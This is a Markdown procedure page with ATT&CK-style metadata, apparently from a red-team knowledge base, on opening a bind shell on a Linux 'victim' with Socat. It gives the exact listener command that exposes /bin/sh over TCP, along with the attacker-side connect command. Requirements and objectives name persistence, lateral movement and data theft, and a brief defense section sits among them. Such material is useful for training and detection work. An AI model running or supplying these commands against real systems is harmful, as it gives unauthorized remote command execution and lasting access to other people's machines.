---
id: cbeb730e-a621-4ce4-b9e2-d4c8df35c46b
type: procedure
name: Socat-Bind-Shell
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.901490+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/External Remote Services|T1133 - External Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Bind Shell]]'
  - '[[tags/Socat]]'
commands:
  - '[[commands/socat-bind-shell-listener]]'
  - '[[commands/socat-connect-to-bind-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Socat]]'
validated: true
---

# Socat-Bind-Shell

## Summary

This procedure demonstrates how to establish a bind shell on a target machine using the Socat utility, allowing an attacker to gain remote command execution by connecting to a listener port opened on the victim system. It is useful in post-exploitation scenarios where the attacker has initial code execution on the target but needs persistent remote access without relying on outbound connections.

## Description

A bind shell involves the target machine creating a listening socket on a specified port and executing a shell process tied to incoming connections. Socat, a versatile networking tool, facilitates this by relaying data between the TCP listener and a shell process. This technique is particularly effective against firewalls that block outbound connections but allow inbound traffic on certain ports. The procedure assumes the attacker has already uploaded and executed the Socat binary on the target (e.g., via initial exploitation). Once the listener is active, the attacker connects from their machine to interact with the shell. This provides interactive command execution on the target, enabling further enumeration, privilege escalation, or data exfiltration. The target environment is typically a Linux system with network access to the attacker's IP on the chosen port.

## Requirements

1. Socat binary uploaded and executable on the target machine (e.g., via wget, curl, or initial exploit payload).
2. Network connectivity allowing the target to listen on the specified port and the attacker to reach the target's IP:port.
3. Sufficient privileges on the target to bind to the port (ports below 1024 may require root).
4. Attacker machine with Socat or Netcat installed for connection.

## Defense

- Monitor network traffic for unusual inbound connections on non-standard ports using tools like iptables, Snort, or endpoint detection agents.
- Implement host-based firewalls to restrict listening sockets and require explicit allowlisting for ports.
- Regularly scan for unauthorized binaries like Socat on endpoints and enforce application whitelisting.
- Enable logging for process creation and network binds to detect anomalous shell executions tied to TCP listeners.

## Objectives

1. Establish a persistent remote shell on the target machine for command execution.
2. Bypass network restrictions that prevent reverse shells by using inbound connections.
3. Maintain access for further post-exploitation activities like lateral movement or data theft.

## Instructions

### Step 1: Set Up Bind Shell Listener on Target

**Context**: On the victim machine, execute the Socat command to create a TCP listener that forks a shell process for each incoming connection. This opens the bind shell, waiting for the attacker's connection. The options ensure a stable, interactive pseudo-terminal (PTY) for the shell.

**Command** ([[commands/socat-bind-shell-listener]]):

```bash
socat TCP-LISTEN:$_PORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

> This command binds to the specified port on all interfaces (or specify an IP with TCP-LISTEN:$_IP:$_PORT). The 'reuseaddr' allows quick rebinding, 'fork' handles multiple connections, and EXEC spawns /bin/sh with PTY for interactivity. Run this after uploading Socat to the target. Expected output is no immediate response; the process backgrounds and listens silently.

### Step 2: Connect to the Bind Shell from Attacker Machine

**Context**: From the attacker's machine, connect to the target's listener to receive the interactive shell. This relays input/output through a raw terminal connection, providing command execution on the target.

**Code** ([[codes/Socat-Bind-Shell-Connection]]):

```bash
socat FILE:`tty`,raw,echo=0 TCP:$_TARGET_IP:$_PORT
```

> This uses the attacker's terminal (tty) in raw mode (no echoing) to connect to the target's IP and port. Upon success, you gain a shell prompt from the target. If the connection fails, verify the listener is active and port is open (e.g., via netstat on target).
